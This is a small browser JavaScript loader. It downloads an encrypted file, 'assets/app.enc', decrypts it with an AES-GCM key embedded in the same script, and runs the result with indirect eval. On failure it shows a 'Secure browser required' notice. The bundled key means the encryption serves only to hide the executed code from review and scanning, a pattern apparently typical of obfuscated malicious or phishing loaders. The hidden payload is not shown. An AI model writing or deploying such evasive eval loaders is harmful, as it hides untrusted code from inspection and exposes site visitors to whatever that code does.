(function () {
  var KEY = "C+XDTUB0EuPY7BE+xzRcMP6dNjWd0h0GPxdt8tWSTVY=",
    FILE = "assets/app.enc";
  function b64(s) {
    var b = atob(s),
      a = new Uint8Array(b.length),
      i = 0;
    for (; i < b.length; i++) a[i] = b.charCodeAt(i);
    return a;
  }
  function fail() {
    var a = document.getElementById("app");
    if (a)
      a.innerHTML =
        '<div style="min-height:100dvh;display:grid;place-items:center;color:#94a6bb;font-family:ui-sans-serif,system-ui,sans-serif;text-align:center;padding:24px"><div><h1 style="color:#e7eef6;font-size:1.4rem;margin:0 0 10px">Secure browser required</h1><p>This portal renders over an encrypted channel. Enable JavaScript and load the site over HTTPS to continue.</p></div></div>';
  }
  if (!window.crypto || !crypto.subtle) {
    return fail();
  }
  fetch(FILE, { cache: "no-store" })
    .then(function (r) {
      if (!r.ok) throw 0;
      return r.text();
    })
    .then(function (t) {
      var raw = b64(t.trim()), iv = raw.slice(0, 12),ct = raw.slice(12);
      return crypto.subtle.importKey("raw", b64(KEY), { name: "AES-GCM" }, false, ["decrypt"]).then(function (k) {
          return crypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, k, ct);
        });
    })
    .then(function (buf) {
      (0, eval)(new TextDecoder().decode(buf));
    })
    .catch(function () {
      fail();
    });/*  */
})();
